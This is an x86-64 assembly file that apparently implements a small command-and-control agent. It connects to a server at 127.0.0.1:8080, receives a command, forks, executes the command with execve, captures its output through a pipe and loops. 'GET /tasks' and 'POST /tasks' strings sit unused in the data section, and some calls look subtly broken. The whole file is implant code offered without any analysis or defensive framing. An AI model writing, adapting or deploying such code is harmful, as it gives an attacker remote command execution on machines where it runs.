%macro clearBuffer 1
  xor     rcx,    rcx
%%_ne:
  mov     QWORD [%1 + rcx], 0x0
  add     rcx,    0x8
  cmp     rcx,    0x100
  jne     %%_ne
%endmacro

section .text
  global _start

_start:
  push    DWORD   0x0
  push    DWORD   0x0100007F
  push    WORD    0x901F
  push    WORD    0x2
_request:
  mov     rax,    0x29
  mov     edi,    0x2
  mov     esi,    0x1
  xor     rdx,    rdx
  syscall
  mov     rdi,    rax
  mov     rsi,    rsp
  mov     rdx,    DWORD 0x10
  mov     rax,    0x2a
  syscall
  test    rax,    rax
  jnz     _exit
  inc     rax
  mov     rsi,    output
  mov     rdx,    0x400
  syscall
  xor     rax,    rax
  sub     rsp,    0x400
  mov     rsi,    rsp
  mov     rdx,    0x400
  syscall
  mov     r14,    rdi
  mov     rax,    0x16
  mov     rdi,    QWORD fds
  syscall
  mov     rax,    0x39
  syscall
  mov     [pid],  rax
  test    rax,    rax
  jz      _childProc
_parentProc:
  mov     rax,    0x3
  mov     rdi,    [fds+4]
  syscall
  clearBuffer output
  xor     rax,    rax
  mov     rdi,    [fds]
  mov     rsi,    output
  mov     rdx,    0x400
  syscall
  cmp     BYTE [output], 0x0
  jne     _continue
  mov     BYTE [output], 0x1
_continue:
  mov     rax,    0x3
  mov     rdi,    [fds]
  syscall
  mov     rax,    0x3
  mov     rdi,    r14
  syscall
  clearBuffer rsp
  add     rsp,    0x400
  jmp     _request
_childProc:
  mov     rax,    0x21
  mov     rdi,    [fds+4]
  mov     rsi,    1
  syscall
  mov     rax,    0x3
  mov     rdi,    fds
  syscall
  mov     rax,    0x3
  mov     rdi,    [fds+4]
  syscall
  mov     rax,    0x3b
  mov     rdi,    rsp
  xor     rsi,    rsi
  xor     rdx,    rdx
  syscall
  mov     rax,    0x3d
  xor     rdi,    rdi
  xor     rsi,    rsi
  xor     rdi,    rdi
  xor     r10,    r10
  syscall
_exit:
  mov     rax,    60
  xor     rdi,    rdi
  syscall

section .bss
  fds:    resd    0x2
  pid:    resd    0x1
  output: resb    0x400
  sockaddr: resq  0x2
  msgbuf: resb    0x400

section .data
  get_task_msg:
    db "GET /tasks HTTP/1.1", 0ah, 0ah, 0h
  get_task_len equ $ - get_task_msg
  response_msg:
    db "POST /tasks HTTP/1.1", 0ah, 0ah, 0h
  response_len equ $ - response_msg
